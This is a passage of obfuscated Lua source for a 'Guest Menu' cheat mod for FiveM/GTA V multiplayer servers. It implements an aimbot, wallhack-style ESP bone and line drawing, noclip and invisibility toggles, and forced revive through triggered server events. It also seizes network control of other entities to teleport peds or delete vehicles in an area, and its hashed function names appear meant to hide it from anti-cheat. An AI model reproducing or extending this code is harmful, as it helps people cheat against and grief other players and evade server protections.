                        if ho < 1 then
                            ho = 1
                        end
                        I.DrawText(
                            GetPlayerName(hn[b7]),
                            {_x, _y},
                            {I.rgb1.r, I.rgb1.g, I.rgb1.b, 255},
                            0.5 / ho,
                            4,
                            1,
                            0
                        )
                        I.DrawText(
                            GetPlayerServerId(hn[b7]),
                            {hs, ht},
                            {I.rgb2.r, I.rgb2.g, I.rgb2.b, 255},
                            0.5 / ho,
                            4,
                            1,
                            0
                        )
                    end
                end
            end
            if I.OptionConfig.GlifeHack then
                for K in EnumeratePeds() do
                    if not IsPedAPlayer(K) and K ~= PlayerPedId() then
                        Wait(1)
                        RequestControlOnce(K)
                        adc12da2eac5ceb7b3e53abdbb48(K, 0)
                        c3188c79a068242c231f422e25ebbae(K, GetEntityCoords(PlayerPedId()))
                    end
                end
            end
            if I.OptionConfig.ESPBones then
                local fN = GetActivePlayers()
                for b7 = 1, #fN do
                    local g2 = fN[b7]
                    local g3 = GetPlayerPed(g2)
                    local hu = GetEntityCoords(g3)
                    x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        hu
                    )
                    local hv = GetPedBoneIndex(g3, 31086)
                    local hw = GetPedBoneIndex(g3, 2992)
                    local hx = GetPedBoneIndex(g3, 28422)
                    local hy = GetPedBoneIndex(g3, 22711)
                    local hz = GetPedBoneIndex(g3, 18905)
                    local hA = GetWorldPositionOfEntityBone(g3, hv, 0.0, 0.0, 0.0)
                    local hB = GetWorldPositionOfEntityBone(g3, hw, 0.0, 0.0, 0.0)
                    local hC = GetWorldPositionOfEntityBone(g3, hx, 0.0, 0.0, 0.0)
                    local hD = GetWorldPositionOfEntityBone(g3, hy, 0.0, 0.0, 0.0)
                    local hE = GetWorldPositionOfEntityBone(g3, hz, 0.0, 0.0, 0.0)
                    local hF = GetWorldPositionOfEntityBone(g3, GetPedBoneIndex(g3, 11816), 0.0, 0.0, 0.0)
                    local hG = GetWorldPositionOfEntityBone(g3, GetPedBoneIndex(g3, 16335), 0.0, 0.0, 0.0)
                    local hH = GetWorldPositionOfEntityBone(g3, GetPedBoneIndex(g3, 46078), 0.0, 0.0, 0.0)
                    local hI = GetWorldPositionOfEntityBone(g3, GetPedBoneIndex(g3, 14201), 0.0, 0.0, 0.0)
                    local hJ = GetWorldPositionOfEntityBone(g3, GetPedBoneIndex(g3, 52301), 0.0, 0.0, 0.0)
                    DrawLine(hA.x, hA.y, hA.z, hB.x, hB.y, hB.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hB.x, hB.y, hB.z, hC.x, hC.y, hC.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hA.x, hA.y, hA.z, hD.x, hD.y, hD.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hD.x, hD.y, hD.z, hE.x, hE.y, hE.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hA.x, hA.y, hA.z, hF.x, hF.y, hF.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hG.x, hG.y, hG.z, hF.x, hF.y, hF.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hH.x, hH.y, hH.z, hF.x, hF.y, hF.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hG.x, hG.y, hG.z, hJ.x, hJ.y, hJ.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    DrawLine(hH.x, hH.y, hH.z, hI.x, hI.y, hI.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                    d.Main.GuestAimMore.GuestResetEntityAlpha(
                        g3
                    )
                    SetEntityAlpha(g3, 200, true)
                end
            end
            I.ScreenWidth, I.ScreenHeight =
                d.Main.GuestInv(
                0x873C9F3104101DD3,
                d.Main.GuestPointerValue(),
                d.Main.GuestPointerValue()
            )
            I.rgb = I.RGBRainbow(1)
            if I.OptionConfig.AimbotEnabled then
                FOV = I.OptionConfig.AimbotFOV
                local gD, gE =
                    d.Main.GuestAimMore.GuestEntityPlayerIsFreeAimingAt(
                    PlayerId()
                )
                if GetEntityType(gE) == 1 then
                    I.OptionConfig.AimbotTargetingLowestResult = {x = 0, y = 0}
                    I.OptionConfig.AimbotTargetingTarget = gE
                end
                if IsPedDeadOrDying(I.OptionConfig.AimbotTargetingTarget) then
                    I.OptionConfig.AimbotTargetingTarget = nil
                    I.OptionConfig.AimbotTargetingLowestResult = {x = 1.0, y = 1.0}
                end
                for gF in EnumeratePeds() do
                    SuccessAimbot = true
                    local x, y, z =
                        d.Main.GuestTable.GuestUnPack(
                        GetEntityCoords(gF)
                    )
                    local cd, _x, _y = World3dToScreen2d(x, y, z)
                    if GetEntityModel(gF) ~= 111281960 then
                        if not IsPedDeadOrDying(gF) then
                            local cd, hK, hL =
                                World3dToScreen2d(
                                d.Main.GuestTable.GuestUnPack(
                                    GetEntityCoords(I.OptionConfig.AimbotTargetingTarget)
                                )
                            )
                            if _x > 0.5 - FOV / 2 and _x < 0.5 + FOV / 2 and _y > 0.5 - FOV / 2 and _y < 0.5 + FOV / 2 then
                                if gF ~= PlayerPedId() then
                                    if I.OptionConfig.AimbotOnlyPlayers then
                                        if IsPedAPlayer(gF) then
                                            SuccessAimbot = true
                                        else
                                            SuccessAimbot = false
                                        end
                                    end
                                    if SuccessAimbot and I.OptionConfig.AimbotInvisibilityCheck then
                                        if IsEntityVisible(gF) then
                                            SuccessAimbot = true
                                        else
                                            SuccessAimbot = false
                                        end
                                    end
                                    if SuccessAimbot and I.OptionConfig.AimbotIgnoreFriends then
                                        for b7 = 1, #FriendsList do
                                            pped = GetPlayerPed(FriendsList[b7])
                                            if gF == pped then
                                                SuccessAimbot = false
                                            end
                                        end
                                    end
                                    if SuccessAimbot then
                                        CrosshairCheck(gF, _x, _y)
                                    end
                                end
                            end
                            if hK > 0.5 - FOV / 2 and hK < 0.5 + FOV / 2 and hL > 0.5 - FOV / 2 and hL < 0.5 + FOV / 2 then
                            else
                                I.OptionConfig.AimbotTargetingLowestResult = {x = 1.0, y = 1.0}
                            end
                        end
                    end
                end
                if I.OptionConfig.AimbotShowTarget and I.OptionConfig.AimbotTargetingTarget ~= nil then
                    local gC =
                        d.Main.GuestAimMore.GuestGetCurrentPedWeaponEntityIndex(
                        PlayerPedId()
                    )
                    local launchPos = GetEntityCoords(gC)
                    DrawLine(
                        launchPos,
                        GetEntityCoords(I.OptionConfig.AimbotTargetingTarget),
                        I.rgb.r,
                        I.rgb.g,
                        I.rgb.b,
                        255
                    )
                end
                if
                    d.Main.GuestAimMore.GuestIsEntityOnScreen(
                        I.OptionConfig.AimbotTargetingTarget
                    ) and
                        IsPedShooting(PlayerPedId()) and
                        IsPlayerFreeAiming(PlayerId())
                 then
                    local coords = GetEntityCoords(I.OptionConfig.AimbotTargetingTarget)
                    RequestCollisionAtCoord(coords.x, coords.y, coords.z)
                    ShootAtBone(I.OptionConfig.AimbotTargetingTarget, I.OptionConfig.AimbotBone, 50)
                end
            end
            if I.OptionConfig.ESPLines then
                local hM = GetEntityCoords(PlayerPedId())
                local fN = GetActivePlayers()
                for b7 = 1, #fN do
                    local g2 = fN[b7]
                    local g3 = GetPlayerPed(g2)
                    local hu = GetEntityCoords(g3)
                    DrawLine(hM.x, hM.y, hM.z, hu.x, hu.y, hu.z, I.rgb.r, I.rgb.g, I.rgb.b, 255)
                end
            end
            if
                I.keyBinds.currentKeybindMenu.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindMenu.handle])
             then
                I.openMenu("Guest")
            end
            if
                I.keyBinds.currentKeybindHealth.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindHealth.handle])
             then
                I.natives.adc12da2eac5ceb7b3e53abdbb48(PlayerPedId(-1), 200)
            end
            if
                I.keyBinds.currentKeybindArmour.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindArmour.handle])
             then
                I.natives.e1281c561cf4fcae7c62d471d8(PlayerPedId(-1), 200)
            end
            if
                I.keyBinds.currentKeybindNoclip.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindNoclip.handle])
             then
                I.functions.cc1ff3b776a022a5ec5b294ad7cc0ac()
            end
            if
                I.keyBinds.currentKeybindEspion.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindEspion.handle])
             then
                I.OptionConfig.noClip = not I.OptionConfig.noClip
                I.OptionConfig.invisible = not I.OptionConfig.invisible
            end
            if
                I.keyBinds.currentKeybindMagneto.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindMagneto.handle])
             then
                I.functions.dcbac0a08778fb9e3b9045c19dd7()
            end
            if
                I.keyBinds.currentKeybindRepair.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindRepair.handle])
             then
                I.functions.f48902895f58b85ba557a3c83a21b1a(
                    I.Guestdata.pLocalPlayer.cVehicle
                )
            end
            if
                I.keyBinds.currentKeybindInvisible.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindInvisible.handle])
             then
                I.OptionConfig.invisible = not I.OptionConfig.invisible
            end
            if
                I.keyBinds.currentKeybindFreecam.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindFreecam.handle])
             then
                I.functions.e58b4efdde3c0191a2b9cc78b56dd()
            end
            if
                I.keyBinds.currentKeybindPanic.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindPanic.handle])
             then
                I.ba324546()
            end
            if
                I.keyBinds.currentKeybinddeleteweps.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybinddeleteweps.handle])
             then
                RemoveAllPedWeapons(I.Guestdata.pLocalPlayer.pedId, true)
            end
            if
                I.keyBinds.currentKeybindRevive.handle and
                    IsDisabledControlJustPressed(0, A[I.keyBinds.currentKeybindRevive.handle])
             then
                local coords = GetEntityCoords(PlayerPedId())
                NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId()), true, false)
                ClearPedBloodDamage(PlayerPedId())
                TriggerEvent("playerSpawned", coords.x, coords.y, coords.z)
                StopScreenEffect("DeathFailOut")
                I.functions.e178da3a04c82538fdaa91c05f2a1f()
            end
            d.Main.GuestWait(0)
        end
    end
)
d.Main.GuestThread(
    function()
        while I.shouldShowMenu do
            if I.OptionConfig.veh2Step then
                I.functions.f68f33c268e7d9184211da7bc3432ba4()
            end
            if I.OptionConfig.vehDriftSmoke then
                RequestNamedPtfxAsset("scr_recartheft")
                while not HasNamedPtfxAssetLoaded("scr_recartheft") do
                    d.Main.GuestWait(1)
                end
                RequestNamedPtfxAsset("core")
                while not HasNamedPtfxAssetLoaded("core") do
                    d.Main.GuestWait(1)
                end
                ang, speed = I.functions.game.vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
                local hN = 0.25
                local hO = 25
                local hP = 1.5
                if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                    if speed >= 1.0 and ang ~= 0 then
                        I.functions.game.driftSmoke(
                            "scr_recartheft",
                            "scr_wheel_burnout",
                            GetVehiclePedIsUsing(GetPlayerPed(-1)),
                            hO,
                            hN
                        )
                    elseif IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                        I.functions.game.driftSmoke(
                            "core",
                            "exp_grd_bzgas_smoke",
                            GetVehiclePedIsUsing(GetPlayerPed(-1)),
                            3,
                            hP
                        )
                    end
                end
            end
            if I.OptionConfig.ForceNamess then
                local h4 = I.natives.GetActivePlayers()
                for b7 = 1, #h4 do
                    local aW = h4[b7]
                    if GetPlayerPed(aW) ~= GetPlayerPed(-1) then
                        local K = GetPlayerPed(aW)
                        local x1, y1, z1 =
                            d.Main.GuestTable.GuestUnPack(
                            GetEntityCoords(I.Guestdata.pLocalPlayer.pedId, true)
                        )
                        local x2, y2, ak =
                            d.Main.GuestTable.GuestUnPack(
                            GetEntityCoords(GetPlayerPed(aW), true)
                        )
                        local distance =
                            I.NewFunction.qfhsiufezy_fhzqdze(#(vector3(x1, y1, z1) - vector3(x2, y2, ak)), 1)
                        if distance < 125 then
                            if NetworkIsPlayerTalking(aW) then
                                I.functions.ed96a054c4590992ad80297aca3df126(
                                    x2,
                                    y2,
                                    ak + 1.25,
                                    "" .. GetPlayerServerId(aW) .. " | " .. GetPlayerName(aW) .. "",
                                    30,
                                    144,
                                    255
                                )
                            else
                                I.functions.ed96a054c4590992ad80297aca3df126(
                                    x2,
                                    y2,
                                    ak + 1.25,
                                    "" .. GetPlayerServerId(aW) .. " | " .. GetPlayerName(aW) .. "",
                                    255,
                                    255,
                                    255
                                )
                            end
                        end
                    end
                end
            end
            I.functions.b5ea815b0f8440ddaeebad4129bd7222()
            d.Main.GuestWait(0)
        end
    end
)
function GetTextWidthS(string, J, au)
    J = J or 4
    au = au or 0.35
    I.Cache[J] = I.Cache[J] or {}
    I.Cache[J][au] = I.Cache[J][au] or {}
    if I.Cache[J][au][string] then
        return I.Cache[J][au][string].length
    end
    d.Main.GuestInv(0x54CE8AC98E120CAB, "STRING")
    d.Main.GuestInv(0x6C188BE134E074AA, string)
    d.Main.GuestInv(0x66E0276CC5F6B9DA, J or 4)
    d.Main.GuestInv(0x07C837F9A01C34C9, au or 0.35, au or 0.35)
    local l =
        d.Main.GuestInv(
        0x85F061DA64ED2F67,
        1,
        d.Main.GuestRRA(),
        Citizen.ResultAsFloat()
    )
    I.Cache[J][au][string] = {length = l}
    return l
end
function I.GetTextWidth(string, J, au)
    return GetTextWidthS(string, J, au)
end
function I.DrawSprite(hQ, hR, x, y, width, height, af, aq, ar, as, at)
    d.Main.GuestInv(
        0xE7FFAE5EBF23D890,
        hQ,
        hR,
        x,
        y,
        width,
        height,
        af,
        aq,
        ar,
        as,
        at
    )
end
function I.DrawRect(x, y, width, height, color)
    d.Main.GuestInv(
        0x3A618A217E5154F0,
        x,
        y,
        width,
        height,
        color.r,
        color.g,
        color.b,
        color.a
    )
end
function I.RGBRainbow(hS)
    if I.GuestCurrentUI.RGB then
        local result = {}
        local hT = GetGameTimer() / 1000
        result.r =
            d.Main.GuestMath.GuestFloor(
            d.Main.GuestMath.GuestSin(
                hT * hS + 0
            ) *
                127 +
                128
        )
        result.g =
            d.Main.GuestMath.GuestFloor(
            d.Main.GuestMath.GuestSin(
                hT * hS + 2
            ) *
                127 +
                128
        )
        result.b =
            d.Main.GuestMath.GuestFloor(
            d.Main.GuestMath.GuestSin(
                hT * hS + 4
            ) *
                127 +
                128
        )
        return result
    else
        return I.rgb
    end
end
rgb = I.RGBRainbow(1)
I.rgb = I.RGBRainbow(1)
local hU = {}
local hV = 1.02
d.Main.GuestThread(
    function()
        while not killmenu do
            for b7 = 1, #hU do
                CurEntry = hU[b7]
                XWidth = I.GetTextWidth(CurEntry, 4, 0.45) + 0.01
                DrawY = b7 * 0.95
                if XWidth < 0.17 then
                    XWidth = 0.17
                end
                I.DrawRect(0.900, hV - DrawY, XWidth, 0.04, {r = 0, g = 0, b = 0, a = 200})
                I.DrawRect(0.900, hV - 0.019 - DrawY, XWidth, 0.002, {r = rgb.r, g = rgb.g, b = rgb.b, a = 255})
                I.DrawText2(CurEntry, {0.900, hV - 0.015 - DrawY}, {255, 255, 255, 255}, 0.45, 4, 1)
            end
            hU = {}
            Wait(0)
        end
    end
)
function I.DrawBottomText(L)
    table.insert(hU, #hU + 1, L)
end
local hW, hX, hT, hY, hZ = 0, 0, 0, 0, 0
I.functions.ed96a054c4590992ad80297aca3df126 = function(x, y, z, L, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    I.natives.setTextFont(0)
    I.natives.setTextProportional(0)
    I.natives.setTextScale(0.0, 0.20)
    I.natives.setTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    I.natives.setTextDropShadow()
    I.natives.setTextOutline()
    I.natives.beginTextCommandDisplayText("STRING")
    SetTextCentre(1)
    I.natives.addTextComponentSubstringPlayerName(L)
    I.natives.endTextCommandDisplayText(0.0, 0.0)
    ClearDrawOrigin()
end
I.functions.Math = {}
I.functions.Math.Round = function(bb, ca)
    if ca then
        local h_ = 10 ^ ca
        return d.Main.GuestMath.GuestFloor(
            bb * h_ + 0.5
        ) / h_
    else
        return d.Main.GuestMath.GuestFloor(
            bb + 0.5
        )
    end
end
I.functions.Math.GroupDigits = function(bb)
    local i0, H, i1 = string.match(bb, "^([^%d]*%d)(%d*)(.-)$")
    return i0 .. H:reverse():gsub("(%d%d%d)", "%1" .. _U("locale_digit_grouping_symbol")):reverse() .. i1
end
I.functions.Math.Trim = function(bb)
    if bb then
        return d.Main.GuestString.GuestGSub(
            bb,
            "^%s*(.-)%s*$",
            "%1"
        )
    else
        return nil
    end
end
I.functions.f1d4856a114a6894f5812bb126a541b = function(i2)
    if
        d99a8e7f010c9f33f11485c499d1af68tate(i2) == "started" or
            d.Main.GuestString.GuestUpper(
                d99a8e7f010c9f33f11485c499d1af68tate(i2)
            ) == "started" or
            d.Main.GuestString.GuestLower(
                d99a8e7f010c9f33f11485c499d1af68tate(i2)
            ) == "started" or
            d99a8e7f010c9f33f11485c499d1af68tate(i2 .. "-master") == "started" or
            d.Main.GuestString.GuestUpper(
                d99a8e7f010c9f33f11485c499d1af68tate(i2 .. "-master")
            ) == "started" or
            d.Main.GuestString.GuestLower(
                d99a8e7f010c9f33f11485c499d1af68tate(i2 .. "-master")
            ) == "started"
     then
        return true
    else
        return false
    end
end
I.functions.e564abecb856e0385c2ecb46e4c6a2b8 = function(i3, x, y)
    I.natives.setTextColour(I.mainColor.r, I.mainColor.g, I.mainColor.b, 255)
    I.natives.setTextFont(0)
    I.natives.setTextProportional(1)
    I.natives.setTextScale(0.0, 0.4)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    I.natives.setTextDropShadow()
    I.natives.setTextOutline()
    I.natives.beginTextCommandDisplayText("STRING")
    I.natives.addTextComponentSubstringPlayerName(i3)
    I.natives.endTextCommandDisplayText(x, y)
end
I.functions.f7ab3c7f27599e9e439768e20b25ed = function()
    d.Main.GuestThread(
        function()
            local entity = I.Guestdata.pLocalPlayer.pedId
            if IsPedInAnyVehicle(entity, false) then
                entity = GetVehiclePedIsUsing(entity)
            end
            local gD = false
            local i4 = false
            local i5 = GetBlipInfoIdIterator()
            local i6 = GetFirstBlipInfoId(8)
            while DoesBlipExist(i6) do
                if GetBlipInfoIdType(i6) == 4 then
                    cx, cy, cz =
                        d.Main.GuestTable.GuestUnPack(
                        GetBlipInfoIdCoord(
                            i6,
                            d.Main.GuestRRA(),
                            d.Main.GuestRAV()
                        )
                    )
                    i4 = true
                    break
                end
                i6 = GetNextBlipInfoId(i5)
                d.Main.GuestWait(0)
            end
            if i4 then
                local i7 = false
                local f_ = GetEntityHeading(entity)
                for b7 = 0, 1000, 1 do
                    I.natives.c3188c79a068242c231f422e25ebbaeNoOffset(entity, cx, cy, ToFloat(b7), false, false, false)
                    SetEntityRotation(entity, 0, 0, 0, 0, 0)
                    SetEntityHeading(entity, f_)
                    SetGameplayCamRelativeHeading(0)
                    d.Main.GuestWait(0)
                    if GetGroundZFor_3dCoord(cx, cy, ToFloat(b7), cz, false) then
                        cz = ToFloat(b7)
                        i7 = true
                        break
                    end
                end
                if not i7 then
                    cz = -300.0
                end
                gD = true
            end
            if gD then
                I.natives.c3188c79a068242c231f422e25ebbaeNoOffset(entity, cx, cy, cz, false, false, true)
                SetGameplayCamRelativeHeading(0)
                if IsPedSittingInAnyVehicle(I.Guestdata.pLocalPlayer.pedId) then
                    if
                        c2c74f255aa73c2253afc9ecc82InVehicleSeat(
                            I.Guestdata.pLocalPlayer.cVehicle,
                            -1
                        ) == I.Guestdata.pLocalPlayer.pedId
                     then
                        SetVehicleOnGroundProperly(I.Guestdata.pLocalPlayer.cVehicle)
                    end
                end
            end
        end
    )
end
I.functions.bd249ffd8df1cc2f86757331 = function(x, y, z)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            c2c74f255aa73c2253afc9ecc82InVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
     then
        entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
    else
        entity = GetPlayerPed(-1)
    end
    if entity then
        I.natives.c3188c79a068242c231f422e25ebbae(entity, x, y, z)
    end
end
I.functions.e6243864ab98971d62fb2c398c2fa = function()
    RequestNamedPtfxAsset("proj_xmas_firework")
    UseParticleFxAssetNextCall("proj_xmas_firework")
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_burst_rgw",
        I.Guestdata.pLocalPlayer.pedId,
        0.0,
        0.0,
        -0.5,
        0.0,
        0.0,
        0.0,
        1.0,
        false,
        false,
        false
    )
end
I.functions.bcdcc63af20b5ed9527b = function()
    RequestNamedPtfxAsset("proj_xmas_firework")
    UseParticleFxAssetNextCall("proj_xmas_firework")
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_burst_rgw",
        I.Guestdata.pLocalPlayer.pedId,
        0.0,
        0.0,
        -0.5,
        0.0,
        0.0,
        0.0,
        1.0,
        false,
        false,
        false
    )
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_firework_xmas_spiral_burst_rgw",
        I.Guestdata.pLocalPlayer.pedId,
        0.0,
        0.0,
        -0.5,
        0.0,
        0.0,
        0.0,
        1.0,
        false,
        false,
        false
    )
    StartNetworkedParticleFxNonLoopedOnEntity(
        "scr_xmas_firework_sparkle_spawn",
        I.Guestdata.pLocalPlayer.pedId,
        0.0,
        0.0,
        -0.5,
        0.0,
        0.0,
        0.0,
        1.0,
        false,
        false,
        false
    )
end
I.functions.c37e16ac04ff4f670efb9a15acc1516 = function(K, coords, af)
    I.natives.c3188c79a068242c231f422e25ebbaeNoOffset(K, coords.x, coords.y, coords.z, false, false, false, true)
    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, af, true, false)
    SetPlayerInvincible(K, false)
    I.exploitthing(false, false, "playerSpawned", coords.x, coords.y, coords.z)
    ClearPedBloodDamage(K)
end
I.functions.e178da3a04c82538fdaa91c05f2a1f = function()
    local coords = GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
    local i8 = {
        x = I.functions.Math.Round(coords.x, 1),
        y = I.functions.Math.Round(coords.y, 1),
        z = I.functions.Math.Round(coords.z, 1)
    }
    I.functions.c37e16ac04ff4f670efb9a15acc1516(I.Guestdata.pLocalPlayer.pedId, i8, 0.0)
    StopScreenEffect("DeathFailOut")
    Guestcustomnotif("~p~Guest Menu : ~s~Revived", 0)
end
I.functions.f48902895f58b85ba557a3c83a21b1a = function(i9)
    SetVehicleEngineHealth(i9, 1000)
    SetVehicleFixed(i9)
    SetVehicleEngineOn(i9, 1, 1)
    SetVehicleBurnout(i9, false)
end
I.functions.ebbd65841190b96a9829425dd0630 = function(i9, h1)
    d.Main.GuestThread(
        function()
            if h1 then
                local ia = I.Guestdata.pLocalPlayer.pedId
                h1 = d.Main.GuestToNum(h1) + 0.01
                local ib = I.functions.game.getVehiclesInArea(GetEntityCoords(ia), h1)
                for h, entity in ipairs(ib) do
                    local ic = 0
                    if entity == I.Guestdata.pLocalPlayer.cVehicle then
                        entity = entity + 1
                    end
                    while not NetworkHasControlOfEntity(entity) and ic < 50 and DoesEntityExist(entity) do
                        NetworkRequestControlOfEntity(entity)
                        ic = ic + 1
                    end
                    if DoesEntityExist(entity) and NetworkHasControlOfEntity(entity) then
                        SetEntityAsMissionEntity(entity, false, true)
                        ebbd65841190b96a9829425dd0630(entity)
                    end
                end
            else
                SetEntityAsMissionEntity(i9, false, true)
                ebbd65841190b96a9829425dd0630(i9)
            end
        end
    )
end
I.functions.eaf9f0780ceafe031efb200e0ebb5f = function()
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        local X = GetVehiclePedIsIn(I.Guestdata.pLocalPlayer.pedId, true)
        if DoesEntityExist(X) then
            local id, ie, ig =
                d.Main.GuestTable.GuestUnPack(
                GetEntityCoords(I.Guestdata.pLocalPlayer.pedId)
            )
            if I.OptionConfig.selectedeaf9f0780ceafe031efb200e0ebb5f == 1 then
                I.natives.c3188c79a068242c231f422e25ebbae(
                    I.Guestdata.pLocalPlayer.pedId,
                    id + 1,
                    ie + 2,
                    ig + 100
                )
            elseif I.OptionConfig.selectedeaf9f0780ceafe031efb200e0ebb5f == 2 then
                I.natives.c3188c79a068242c231f422e25ebbae(
                    I.Guestdata.pLocalPlayer.pedId,
                    195.23,
                    -934.04,
                    30.69
                )
            elseif I.OptionConfig.selectedeaf9f0780ceafe031efb200e0ebb5f == 3 then
                I.natives.c3188c79a068242c231f422e25ebbae(
                    I.Guestdata.pLocalPlayer.pedId,
                    -1653.85,
                    -860.87,
                    9.16
                )
            elseif I.OptionConfig.selectedeaf9f0780ceafe031efb200e0ebb5f == 4 then
                I.natives.c3188c79a068242c231f422e25ebbae(
                    I.Guestdata.pLocalPlayer.pedId,
                    2024.28,
                    3770.94,
                    32.18
                )
            elseif I.OptionConfig.selectedeaf9f0780ceafe031efb200e0ebb5f == 5 then
                I.natives.c3188c79a068242c231f422e25ebbae(
                    I.Guestdata.pLocalPlayer.pedId,
                    -183.57,
                    6366.65,
                    31.47
                )
            end
            local ih =
                CreatePedInsideVehicle(
                X,
                4,
                GetEntityModel(I.Guestdata.pLocalPlayer.pedId),
                -1,
                true,
                false
            )
            I.functions.sPO.c13f3928c35c767959c7acf6328801(
                ih,
                I.Guestdata.pLocalPlayer.pedId
            )
            SetEntityAsMissionEntity(ih, 0, 0)
            TaskVehicleDriveToCoordLongrange(ih, X, -34.552, -673.060, 31.944, 100.0, 537657916, 1.0)
            SetDriveTaskDrivingStyle(ih, 6)
            local ii = GetEntityModel(X)
            local ij = I.functions.sPO.bad7bcc70f01461807952895fdaabcd(ii, PlayerId())
            local ik = I.functions.game.getVehicleProperties(X)
            ik.plate = nil
            I.functions.game.setVehicleProperties(ij, ik)
        else
            Guestcustomnotif("~p~Guest Menu : ~s~Error getting your car")
            o("vehicle entity doesnt exist")
        end
    else
        Guestcustomnotif("~p~Guest Menu : ~s~You're not in a vehicle")
    end
end
I.functions.f68f33c268e7d9184211da7bc3432ba4 = function()
    p_flame_location = {
        "exhaust",
        "exhaust_2",
        "exhaust_3",
        "exhaust_4",
        "exhaust_5",
        "exhaust_6",
        "exhaust_7",
        "exhaust_8",
        "exhaust_9",
        "exhaust_10",
        "exhaust_11",
        "exhaust_12",
        "exhaust_13",
        "exhaust_14",
        "exhaust_15",
        "exhaust_16"
    }
    p_flame_particle = "veh_backfire"
    p_flame_particle_asset = "core"
    p_flame_size = 2.0
    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
        local il = GetVehiclePedIsIn(GetPlayerPed(-1))
        local im = GetEntityCoords(GetPlayerPed(-1))
        local io = GetEntityCoords(il)
        local ip = GetVehicleCurrentRpm(GetVehiclePedIsIn(GetPlayerPed(-1)))
        if c2c74f255aa73c2253afc9ecc82InVehicleSeat(il, -1) == GetPlayerPed(-1) then
            local iq =
                d.Main.GuestMath.GuestRand(
                250,
                750
            )
            local ir =
                d.Main.GuestMath.GuestRand(
                2,
                6
            ) / 1.5
            if ip > 0.3 and ip < 0.6 then
                for cd, is in pairs(p_flame_location) do
                    if GetEntityBoneIndexByName(il, is) >= 0 then
                        UseParticleFxAssetNextCall(p_flame_particle_asset)
                        createdPart =
                            StartParticleFxLoopedOnEntityBone(
                            p_flame_particle,
                            NetToVeh(VehToNet(il)),
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            0.0,
                            GetEntityBoneIndexByName(NetToVeh(VehToNet(il)), is),
                            ir,
                            0.0,
                            0.0,
                            0.0
                        )
                        StopParticleFxLooped(createdPart, 1)
                    end
                end
                I.natives.d5cb04ddaa81e3685adb07e123e0631(io.x, io.y, io.z, 61, 0.0, true, true, 0.0, true)
                I.Guestdata.pLocalPlayer.should2stepAutist = true
                d.Main.GuestWait(iq)
            else
                I.Guestdata.pLocalPlayer.should2stepAutist = false
            end
        end
    end
end
I.functions.f9c87ad6955fa7d2353023a55e5742a5 = function(veh)
    SetVehicleModKit(veh, 0)
    SetVehicleCustomPrimaryColour(I.Guestdata.pLocalPlayer.cVehicle, 0, 0, 0)
    SetVehicleCustomSecondaryColour(I.Guestdata.pLocalPlayer.cVehicle, 0, 0, 0)
    SetVehicleColours(veh, 12, 12)
    SetVehicleModColor_1(veh, 3, false)
    SetVehicleExtraColours(veh, 3, false)
    ToggleVehicleMod(veh, 18, true)
    ToggleVehicleMod(veh, 22, true)
    SetVehicleMod(veh, 16, 5, false)
    SetVehicleMod(veh, 12, 2, false)
    SetVehicleMod(veh, 11, 3, false)
    SetVehicleMod(veh, 14, 14, false)
    SetVehicleMod(veh, 15, 3, false)
    SetVehicleMod(veh, 13, 2, false)
    SetVehicleWindowTint(veh, 5)
    SetVehicleWheelType(veh, false)
    SetVehicleMod(veh, 23, 21, true)
    SetVehicleMod(veh, 0, 1, false)
    SetVehicleMod(veh, 1, 1, false)
    SetVehicleMod(veh, 2, 1, false)
    SetVehicleMod(veh, 3, 1, false)
    SetVehicleMod(veh, 4, 1, false)
    SetVehicleMod(veh, 5, 1, false)
    SetVehicleMod(veh, 6, 1, false)
    SetVehicleMod(veh, 7, 1, false)
    SetVehicleMod(veh, 8, 1, false)
    SetVehicleMod(veh, 9, 1, false)
    SetVehicleMod(veh, 10, 1, false)
    IsVehicleNeonLightEnabled(veh, true)
    SetVehicleNeonLightEnabled(veh, 0, true)
    SetVehicleNeonLightEnabled(veh, 1, true)
